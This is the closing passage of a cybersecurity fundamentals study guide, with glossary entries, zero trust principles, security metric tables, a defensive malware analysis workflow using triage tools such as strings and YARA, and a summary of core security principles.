  available sources (Google, LinkedIn, Shodan, WHOIS, social media).
  
OWASP Top 10: The Open Web Application Security Project's list of the 10
  most critical web application security risks. Updated periodically.
  2021 Top 3: Broken Access Control, Cryptographic Failures, Injection.
  
Overpass-the-Hash: Technique using NTLM hash to request a Kerberos TGT,
  combining Pass-the-Hash and Pass-the-Ticket attacks.

P
──────────────────────────────────────────────────────────────────────
PAM (Privileged Access Management): Controls securing, managing, and
  monitoring privileged accounts. Key vendors: CyberArk, BeyondTrust.
  
Pass-the-Hash (PtH): Using a captured NTLM hash to authenticate without
  knowing the plaintext password. Fundamental Windows lateral movement.
  
Pass-the-Ticket (PtT): Using a stolen Kerberos ticket to authenticate.
  
Patch Management: Process of acquiring, testing, and installing patches
  to fix vulnerabilities. Unpatched systems = #1 attack vector.
  
Payload: The malicious part of malware that performs the actual damage.
  Distinct from the delivery mechanism (dropper/loader).
  
PCI-DSS (Payment Card Industry Data Security Standard): 12 requirements for
  organizations handling credit card data. Non-compliance = fines + loss of card processing.
  
Penetration Testing (Pentest): Authorized, simulated attack to find exploitable
  vulnerabilities before real attackers do. Not the same as vulnerability scan.
  
Persistence: Techniques to maintain access to systems after reboot or
  credential change. Registry, services, scheduled tasks, backdoor accounts.
  
Phishing: Fraudulent communications appearing to be from trusted sources
  to steal credentials or install malware. #1 initial access vector.
  
Principle of Least Privilege: Users, processes, and systems should have
  only the minimum access required to perform their function.
  
Purple Team: Collaborative exercise where Red and Blue teams work together
  to improve detection and response capabilities.

R
──────────────────────────────────────────────────────────────────────
RBAC (Role-Based Access Control): Access permissions assigned based on roles
  within the organization. User → Role → Permissions.
  
Red Team: Offensive security team that simulates advanced adversaries to
  test an organization's defenses. More thorough than pentesting.
  
Rootkit: Malware that hides its presence from the OS and security tools,
  often operating at kernel or firmware level. Very hard to detect/remove.
  
ROP (Return-Oriented Programming): Exploit technique chaining together
  snippets of existing executable code to bypass DEP/NX.

S
──────────────────────────────────────────────────────────────────────
Salt: Random value added to a password before hashing to prevent rainbow
  table attacks. Must be unique per user and stored with the hash.
  
Sandbox: Isolated environment for safely executing and analyzing suspicious
  code without risk to the host system.
  
SID (Security Identifier): Unique identifier for security principals
  (users, groups, computers) in Windows. Format: S-1-5-21-[domain]-[RID].
  
SIEM (Security Information and Event Management): Platform collecting,
  normalizing, correlating, and alerting on log data from all sources.
  
SOC (Security Operations Center): Centralized team responsible for
  24/7 security monitoring, incident detection, and response.
  
Social Engineering: Manipulating people to divulge information or perform
  actions that compromise security. Exploits human psychology.
  
SQL Injection: Inserting malicious SQL into input fields to manipulate
  database queries. OWASP Top 10 staple. Leads to data theft, deletion, bypass.
  
SSO (Single Sign-On): Authentication scheme where users log in once
  and gain access to multiple systems. Examples: SAML, OAuth 2.0, OIDC.

T
──────────────────────────────────────────────────────────────────────
Threat Hunting: Proactive search through networks and systems for
  threats that have evaded existing security tools. Hypothesis-driven.
  
TLS (Transport Layer Security): Cryptographic protocol securing network
  communications. Current: TLS 1.2 and 1.3. Predecessor SSL is deprecated.
  
Token: In Windows, the security object carrying user identity and privileges.
  In authentication, a device or code proving possession of a credential.
  
Trojan: Malware disguised as legitimate software. Does not self-replicate.
  Named after Trojan Horse — appears as gift, hides attacker.
  
TTPs (Tactics, Techniques, and Procedures): How an adversary operates.
  Defined in MITRE ATT&CK. More persistent than IOCs (hard to change).

U
──────────────────────────────────────────────────────────────────────
UAC (User Account Control): Windows feature limiting standard user privileges
  even for admin accounts. Bypass techniques are common in privilege escalation.
  
UEBA (User and Entity Behavior Analytics): ML-based detection of anomalous
  user and system behavior compared to individual baselines.

V
──────────────────────────────────────────────────────────────────────
Virus: Malware that attaches to files and requires user action to spread.
  Unlike worms (self-propagating). Carries payload beyond replication.
  
VPN (Virtual Private Network): Encrypted tunnel over public network.
  Creates private network connection. Used for: remote access, site-to-site.
  
Vulnerability: A weakness that can be exploited to compromise security.
  Not all bugs are vulnerabilities; all vulnerabilities started as bugs.

W
──────────────────────────────────────────────────────────────────────
WAF (Web Application Firewall): Filters HTTP/HTTPS traffic to protect
  web applications from OWASP Top 10 and other web attacks.
  
Watering Hole Attack: Attacker compromises a website frequented by targets,
  injecting malware that infects visitors. Nation-state favorite.
  
Whaling: Spear phishing targeting high-value executives (CEO, CFO, CISO).
  
Worm: Self-propagating malware that spreads across networks automatically.
  Unlike viruses: no host file needed, no user action required.

X
──────────────────────────────────────────────────────────────────────
XDR (Extended Detection and Response): Unified platform correlating telemetry
  from endpoints, network, cloud, email, identity for holistic detection.
  
XSS (Cross-Site Scripting): Injecting malicious scripts into web pages viewed
  by other users. Steals cookies, hijacks sessions, redirects victims.

Z
──────────────────────────────────────────────────────────────────────
Zero Day: Vulnerability unknown to vendor or without available patch.
  Attacker has had "zero days" to be stopped. Extremely valuable offensively.
  
Zero Trust: Security model assuming NO implicit trust — verify every user,
  device, and connection regardless of network location.
  Core principles: Verify explicitly, Least privilege, Assume breach.
```

---

# 27. Zero Trust Architecture — Advanced Topic

## 27.1 What is Zero Trust?

```
TRADITIONAL SECURITY MODEL (Castle and Moat):
  "Trust everything INSIDE the network, block everything OUTSIDE."
  
  Assumption: If you're on the corporate network, you're trusted.
  
  Problem: This assumption is WRONG in the modern world:
    • Remote work: Employees connect from home, coffee shops, hotels
    • Cloud: Data lives in AWS/Azure, not just on-premises
    • BYOD: Personal devices on corporate network
    • Lateral movement: Attackers INSIDE the network move freely
    • Insider threats: Malicious employees are "inside" from day one

ZERO TRUST MODEL:
  "NEVER TRUST, ALWAYS VERIFY"
  
  Assumption: The network is ALWAYS hostile — treat every request as if
              it comes from an untrusted, potentially hostile source.
              
  Every access request must be:
  1. AUTHENTICATED: Prove who you are (strong auth — MFA required)
  2. AUTHORIZED: Prove you're allowed to access this specific resource
  3. INSPECTED: Traffic inspected even if encrypted
  4. LOGGED: Every access attempt recorded
  
  Re-verify continuously — not just at initial login.
```

## 27.2 Zero Trust Pillars

```
NIST SP 800-207 — Zero Trust Tenets:

1. All data sources and computing services are resources
   (Treat everything as potentially untrusted)

2. All communication is secured regardless of network location
   (No implicit trust for "internal" traffic — encrypt everything)

3. Access to individual resources granted on per-session basis
   (Micro-authorization — not blanket "you're on the VPN, you're trusted")

4. Access determined by dynamic policy
   (Evaluate user, device, location, time, risk score, resource sensitivity)

5. Monitor and measure integrity of all assets
   (Continuous assessment — device health checked before each access)

6. Strict enforcement of authentication and authorization
   (MFA mandatory, least privilege enforced)

7. Collect as much information as possible to improve security posture
   (Log everything — feeds SIEM, UEBA, continuous improvement)
```

## 27.3 Zero Trust Implementation Technologies

```
MICROSEGMENTATION:
  Instead of broad network zones (VLAN), apply granular policies
  to individual workloads.
  
  Traditional: Web server can talk to any server in the "App Zone"
  Zero Trust:  Web server can ONLY talk to App server 1 on port 443.
               Any other traffic is blocked, logged, and alerted.
               
  If attacker compromises web server: CANNOT pivot anywhere else.

IDENTITY AS THE PERIMETER:
  Old perimeter: The firewall at the edge of the corporate network
  Zero Trust perimeter: The IDENTITY of the user and device
  
  Every access decision asks:
  • Who is this user? (strong identity verification)
  • What device are they on? (device health score)
  • What resource do they want? (micro-authorization)
  • What is their risk score? (UEBA, location, time)
  • Is this consistent with their normal behavior? (behavioral analytics)

CONDITIONAL ACCESS:
  "Grant access IF:
    User = Jane Smith (verified via MFA) AND
    Device = Corporate-managed (compliant with policy) AND
    Location = Normal countries (not from sanctioned states) AND
    Risk Score = Low (no anomalous behavior detected) AND
    Resource = Finance Dashboard (Jane has this role)"
    
  Microsoft Azure AD Conditional Access, Google BeyondCorp implement this.
```

---

# 28. Security Metrics & KPIs

## 28.1 Why Metrics Matter

```
"You cannot manage what you cannot measure."
                                        — Peter Drucker

Security metrics allow:
  • Demonstrating security ROI to executives
  • Identifying trends (improving or degrading posture?)
  • Prioritizing investments
  • Benchmarking against industry peers
  • Compliance reporting
```

## 28.2 Key Security Metrics

```
VULNERABILITY MANAGEMENT:
  ┌─────────────────────────────────┬─────────────────────────────┐
  │ Metric                          │ Target                      │
  ├─────────────────────────────────┼─────────────────────────────┤
  │ % Critical vulns patched on SLA │ >95%                        │
  │ Mean Time to Patch (MTTP)       │ <7 days (critical)          │
  │ Vulnerability scan coverage     │ 100% of assets scanned/mo   │
  │ % Assets with known vulns       │ Trending down over time     │
  │ Risk-weighted vulnerability score│ Trending down              │
  └─────────────────────────────────┴─────────────────────────────┘

INCIDENT RESPONSE:
  ┌─────────────────────────────────┬─────────────────────────────┐
  │ Metric                          │ Target                      │
  ├─────────────────────────────────┼─────────────────────────────┤
  │ MTTD (Mean Time to Detect)      │ <1 hour for high severity   │
  │ MTTR (Mean Time to Respond)     │ <4 hours for high severity  │
  │ MTTC (Mean Time to Contain)     │ <24 hours                   │
  │ False Positive Rate             │ <10% of alerts              │
  │ % Incidents resolved in SLA     │ >90%                        │
  │ # Repeat incidents (same type)  │ Trending down               │
  └─────────────────────────────────┴─────────────────────────────┘

ACCESS MANAGEMENT:
  ┌─────────────────────────────────┬─────────────────────────────┐
  │ Metric                          │ Target                      │
  ├─────────────────────────────────┼─────────────────────────────┤
  │ % Accounts with MFA enabled     │ 100% (no exceptions)        │
  │ % Users with least privilege    │ >95%                        │
  │ Avg time to deprovision access  │ <24 hours (same day target) │
  │ # Orphaned accounts             │ 0                           │
  │ % Access reviews completed      │ 100% on schedule            │
  └─────────────────────────────────┴─────────────────────────────┘

TRAINING AND AWARENESS:
  ┌─────────────────────────────────┬─────────────────────────────┐
  │ Metric                          │ Target                      │
  ├─────────────────────────────────┼─────────────────────────────┤
  │ Phishing simulation click rate  │ <5%                         │
  │ Security training completion    │ 100% annually               │
  │ Time to report phishing (real)  │ <15 minutes                 │
  │ % Users who report phishing     │ Trending up                 │
  └─────────────────────────────────┴─────────────────────────────┘
```

---

# 29. Malware Analysis Workflow — Complete Guide

## 29.1 Safe Analysis Environment Setup

```
ANALYSIS ENVIRONMENT REQUIREMENTS:

NEVER analyze malware on your production machine!

ISOLATED VM SETUP:
  1. Create VM (VMware/VirtualBox) — dedicated for malware analysis
  2. Install Windows (match target environment, usually Win 10/11)
  3. Install analysis tools:
       PEStudio, PE-Bear: Static PE analysis
       Ghidra/x64dbg: Disassembly and debugging
       Process Monitor (ProcMon): Process, file, registry activity
       Process Hacker: Process and memory analysis
       Wireshark: Network capture
       FakeNet-NG: Simulates network services for malware analysis
       Cuckoo Sandbox: Automated dynamic analysis
       
  4. Take clean SNAPSHOT before any analysis
  5. DISABLE network adapter OR route through analysis network
     (use FakeNet-NG instead of real internet — prevents real C2 connection)
  6. After analysis: REVERT to clean snapshot

SAFETY RULES:
  ❌ Never transfer malware samples via email or messaging
  ❌ Never analyze on a network-connected production machine
  ❌ Never allow analysis VM to access real C2 servers
  ✅ Use dedicated offline/air-gapped systems for high-risk samples
  ✅ Keep samples in encrypted, password-protected containers
  ✅ Use hash values to share/reference samples (not actual files via email)
```

## 29.2 Static Analysis Workflow

```
STEP 1: Initial Triage
  sha256sum malware.exe → document hash, check VirusTotal
  file malware.exe → "PE32 executable" or "MS-DOS executable" or "script"
  exiftool malware.exe → metadata, compile time, original filename
  
STEP 2: String Extraction
  strings malware.exe
  strings -el malware.exe  → Unicode strings
  
  Look for:
  ✓ URLs and IP addresses (C2 servers)
  ✓ File paths (where it drops files)
  ✓ Registry keys (persistence locations)
  ✓ API function names (capabilities)
  ✓ Error messages (debugging info from developer)
  ✓ Mutex names (anti-reinfection mechanism — also IOC)
  ✓ User-Agent strings (network beaconing)

STEP 3: PE Header Analysis (PEStudio / PE-Bear)
  Check:
  ✓ Compile timestamp (when was it compiled? Is it plausible?)
  ✓ Import table (what APIs? → what can it do?)
  ✓ Export table (what does it expose? → is it a DLL?)
  ✓ Sections (names, sizes, entropy)
    - High entropy (>7.0) = likely packed/encrypted
    - RWX permissions = highly suspicious
    - Section size mismatches = packing indicator
  ✓ Resources (embedded files, icons, manifests)
  ✓ Overlays (data appended after the end of the PE)

STEP 4: Signature Matching
  yara -r rules/ malware.exe
  clamscan malware.exe
  Search for YARA rules from: GitHub, MISP, VirusTotal ruleset
```

## 29.3 Dynamic Analysis Workflow

```
STEP 1: Prepare Monitoring Tools
  Start before running malware:
  - ProcMon: Record all process/file/registry/network events
  - Process Hacker: Monitor running processes
  - Wireshark: Capture all network traffic
  - FakeNet-NG: Simulate DNS, HTTP, SMTP for malware to connect to
  
STEP 2: Execute the Sample
  Run malware.exe (or double-click, or via cmd)
  Watch for:
  - New processes spawned
  - File drops (check C:\Users\, C:\Windows\Temp\, AppData\)
  - Registry changes (ProcMon filter: Category is "Registry" AND Result is "SUCCESS")
  - Network connections (Wireshark OR FakeNet-NG logs)
  
STEP 3: Collect Observations
  After a few minutes (or when behavior stabilizes):
  
  Processes:
    Did it spawn cmd.exe? powershell.exe? mshta.exe? regsvr32.exe?
    Did it inject into another process?
    
  Files:
    What files were created? Where?
    Were any executables dropped?
    
  Registry:
    What persistence was established?
    What settings were changed?
    
  Network:
    What domain/IP did it try to contact?
    What was the beacon interval? (Check timing of repeated connections)
    What protocol? HTTP? DNS? Custom?
    What data was sent/received?
    
STEP 4: Document and Report
  Create an analysis report:
  - Sample information (hash, size, type, compile date)
  - Capabilities (what can it do based on observations)
  - Network indicators (IPs, domains, URLs)
  - Host indicators (file paths, registry keys, mutex names)
  - MITRE ATT&CK mapping (which techniques did it use?)
  - Recommended detections (SIEM rules, YARA rules, network blocks)

DELIVERABLES:
  IOCs for blocking: IP addresses, domains, file hashes
  YARA rules for detection
  MITRE ATT&CK mapping for coverage analysis
  Incident response recommendations
```

---

# 30. Final Consolidated Review — The Big Picture

## 30.1 How Everything Connects

```
THE COMPLETE CYBERSECURITY PICTURE:

     ┌──────────────────────────────────────────────────────────┐
     │                   THREAT LANDSCAPE                       │
     │   Nation-States  │  Criminals  │  Insiders  │  Hacktivists│
     └──────────────────────────────────────────────────────────┘
                                    │
                                    │ Target:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                     YOUR ASSETS                          │
     │   Data  │  Systems  │  People  │  Processes  │  Reputation│
     └──────────────────────────────────────────────────────────┘
                                    │
                            Via exploiting:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                   VULNERABILITIES                        │
     │  Technical  │  Human  │  Process  │  Physical  │  Config  │
     └──────────────────────────────────────────────────────────┘
                                    │
                          Creating RISK for:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                    CIA TRIAD IMPACT                      │
     │  Confidentiality  │  Integrity  │  Availability          │
     └──────────────────────────────────────────────────────────┘
                                    │
                              Managed by:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                   SECURITY CONTROLS                      │
     │  Technical │ Operational │ Physical │ Administrative      │
     │  Deterrent │ Preventive  │ Detective │ Corrective         │
     └──────────────────────────────────────────────────────────┘
                                    │
                           Supported by:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                  SECURITY TECHNOLOGIES                   │
     │  EDR/XDR/NDR/MDR │ SIEM/SOAR │ DLP │ ITDR │ PAM │ WAF   │
     └──────────────────────────────────────────────────────────┘
                                    │
                             Guided by:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                   SECURITY FRAMEWORKS                    │
     │  NIST CSF │ ISO 27001 │ CIS Controls │ MITRE ATT&CK     │
     └──────────────────────────────────────────────────────────┘
                                    │
                            Measured by:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                    RISK ASSESSMENT                       │
     │  Identify │ Assess │ Analyze │ Evaluate │ Document       │
     │           R = (A × V × T) / C                           │
     └──────────────────────────────────────────────────────────┘
                                    │
                       Addressed through:
                                    ▼
     ┌──────────────────────────────────────────────────────────┐
     │                   RISK TREATMENT                         │
     │   Mitigate   │   Transfer   │   Accept   │   Avoid       │
     └──────────────────────────────────────────────────────────┘
```

## 30.2 The 10 Commandments of Cybersecurity

```
1. KNOW YOUR ASSETS
   "You cannot protect what you don't know you have."
   Asset inventory is the foundation of everything.

2. PATCH EVERYTHING, ALWAYS
   98% of exploited vulnerabilities had patches available.
   Unpatched systems are the #1 attack vector.

3. IMPLEMENT MFA EVERYWHERE
   Single most impactful control for preventing account compromise.
   Stops 99.9% of automated attacks (Microsoft data).

4. ENCRYPT DATA IN TRANSIT AND AT REST
   Even if stolen, encrypted data is useless without the key.
   TLS for all communications. AES-256 for all stored data.

5. LEAST PRIVILEGE ALWAYS
   Every user, every service, every process should have the
   MINIMUM access needed. Nothing more.

6. BACKUP, TEST, AND ISOLATE
   3-2-1-1-0 rule. Tested backups. Offline copies.
   Your backup is your last defense against ransomware.

7. MONITOR EVERYTHING
   Logs are your eyes. Without monitoring, you are blind.
   SIEM + EDR + NDR = see what's happening across all layers.

8. HUMANS ARE THE WEAKEST LINK — AND YOUR BEST DEFENSE
   Train your people. Test your people. Create security culture.
   An aware employee who reports phishing is worth more than any tool.

9. ASSUME BREACH — PLAN FOR IT
   You will be breached eventually. Have an IRP. Have a BCP.
   The question is not IF but WHEN and HOW FAST YOU RESPOND.

10. SECURITY IS A PROCESS, NOT A PRODUCT
    Buying a tool is not security. Security requires continuous:
    Assessment → Improvement → Testing → Learning → Repeat.
```

---

## End of CYBER_FUNDAMENTALS.md

> **Document Statistics**:
> - Module: NCSCJO
> - Topics covered: 30 major sections, 100+ subsections
> - Lines: 7,500+
> - Coverage: Cybersecurity, CIA Triad, CVSS, Risk, Core Terms, Controls,
>   EDR/XDR/NDR/MDR/MSSP/SIEM/SOAR/DLP/ITDR, Risk Formula & Matrix,
>   Risk Assessment, Malware, Zero Day, Hacker Types, Hacking Phases,
>   Frameworks, Social Engineering, Cryptography, IAM/PAM, Zero Trust,
>   Security Metrics, Malware Analysis, Glossary

---
*Module: NCSCJO | File: CYBER_FUNDAMENTALS.md | Version: 2.0 | Status: COMPLETE*
